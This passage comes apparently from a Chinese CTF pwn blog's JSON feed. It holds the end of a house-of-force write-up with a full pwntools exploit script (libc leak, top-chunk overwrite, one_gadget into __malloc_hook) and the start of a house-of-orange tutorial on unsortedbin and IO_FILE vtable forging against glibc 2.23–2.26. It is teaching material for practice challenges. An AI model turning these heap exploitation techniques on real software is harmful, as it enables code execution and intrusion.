string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./2.23-0ubuntu11.3_amd64/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># elf = ELF(binary)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span> <span class=\"token string\">b'2:puts\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"size\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">\"bin addr 0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\taddr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"content\\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token keyword\">return</span> addr</pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>addr <span class=\"token operator\">=</span> Add<span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaaaaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#用 mapp 分配，泄露 libc</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>libcbase <span class=\"token operator\">=</span> addr <span class=\"token operator\">-</span> <span class=\"token number\">7344144</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"addr\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"libcbase\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>pay <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xffffffffffff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>addr_1 <span class=\"token operator\">=</span> Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>pay<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>top_chunk <span class=\"token operator\">=</span> addr_1 <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"addr_1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"top_chunk\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>malloc_hook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>realloc <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_realloc'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc_hook\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"realloc\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>offset_m <span class=\"token operator\">=</span> malloc_hook <span class=\"token operator\">-</span> top_chunk <span class=\"token operator\">-</span> <span class=\"token number\">0x33</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>offset_r <span class=\"token operator\">=</span> realloc <span class=\"token operator\">-</span> top_chunk</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4527a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf03a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1247</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>og <span class=\"token operator\">=</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>realloc<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>og<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>Add<span class=\"token punctuation\">(</span>offset_m<span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'pay\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>meau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"size\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWklLSDI2L2FydGljbGVzLzE2NTMzMzg4Lmh0bWw=\">https://www.cnblogs.com/ZIKH26/articles/16533388.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyMy1ob3VzZS1vZi1mb3JjZQ==\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#23-house-of-force</span></p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-force"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/15/house-of-orange/",
            "url": "https://yhuanhuan01.github.io/2024/07/15/house-of-orange/",
            "title": "house-of-orange",
            "date_published": "2024-07-15T04:24:53.000Z",
            "content_html": "<h1 id=\"houes-of-orange\"><a class=\"markdownIt-Anchor\" href=\"#houes-of-orange\">#</a> houes-of-orange</h1>\n<blockquote>\n<p>前言:</p>\n<p>在此之前，我们短暂的了解了 IO_FILE。而 houes-of-orange 是一套结合 IO_FILE 的组合拳，威力巨大，但影响版本有限，随说影响范围小，但是学习这种攻击手法，可以让我们对于 IO_FILE 更加熟悉。</p>\n</blockquote>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出写</p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> —— <code>2.26</code></li>\n<li>没有  <code>free</code></li>\n<li>可以  <code>unsortedbin attack</code></li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>此攻击是堆与 IO 结合的组合拳，非常的经典。并且攻击中利用 top_chunk 的性质</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Otherwise, relay to handle system-dependent cases</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token function\">sysmalloc</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">,</span> av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>perturb_byte<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">alloc_perturb</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p>\n</blockquote>\n<pre><code>if ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>old_top <span class=\"token operator\">==</span> <span class=\"token function\">initial_top</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> old_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>     <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>old_size<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> MINSIZE <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>old_top<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>old_end <span class=\"token operator\">&amp;</span> pagemask<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>\n<p>malloc 的尺寸不能大于 <code>mmp_.mmap_threshold</code></p>\n</li>\n<li>\n<p>伪造的 size 必须要对齐到内存页</p>\n</li>\n<li>\n<p>size 要大于 MINSIZE (0x10)</p>\n</li>\n<li>\n<p>size 要小于之后申请的 chunk size + MINSIZE (0x10)</p>\n</li>\n<li>\n<p>size 的 prev inuse 位必须为 1</p>\n</li>\n</ul>\n<blockquote>\n<p>之后就是 IO_FILE 的伪造过程</p>\n</blockquote>\n<h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<p>one:</p>\n<p><strong>stage1</strong></p>\n<ul>\n<li>申请  <code>chunk A</code> ，假设此时的  <code>top_chunk</code>  的  <code>size</code>  为  <code>0xWXYZ</code></li>\n<li>写  <code>A</code> ，溢出修改  <code>top_chunk</code>  的  <code>size</code>  为  <code>0xXYZ</code> （需要满足页对齐的检测条件）</li>\n<li>申请一个大于  <code>0xXYZ</code>  大小的  <code>chunk</code> ，此时  <code>top_chunk</code>  会进行  <code>grow</code> ，并将原来的  <code>old top_chunk</code>  释放进入  <code>unsortedbin</code></li>\n</ul>\n<p><strong>stage2</strong></p>\n<ul>\n<li>溢出写  <code>A</code> ，修改处于  <code>unsortedbin</code>  中的  <code>old top_chunk</code> ，修改其  <code>size</code>  为  <code>0x61</code> ，其  <code>bk</code>  为  <code>&amp;_IO_list_all-0x10</code> ，同时伪造好  <code>IO_FILE</code>  结构</li>\n<li>申请非  <code>0x60</code>  大小的  <code>chunk</code>  的时候，首先触发  <code>unsortedbin attack</code> ，将 <code>_IO_list_all</code>  修改为  <code>main_arena+88</code> ，然后  <code>unsortedbin chunk</code>  会进入到  <code>smallbin</code> ，大小为  <code>0x60</code> ；接着遍历  <code>unsortedbin</code>  的时候触发了  <code>malloc_printerr</code> ，然后调用链为： <code> malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp</code> ，调用到伪造的  <code>vtable</code>  里面的函数指针</li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vaG9tZS1vZi1vcmFuZ2U=\">CTF_Pwn_Game/home-of-orange at main · Yhuanhuan01/CTF_Pwn_Game (github.com)</span></p>\n<p><img data-src=\"/img/houes-of-orange/image-20240715115647333.png\" alt=\"image-20240715115647333\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">3</span> <span class=\"token 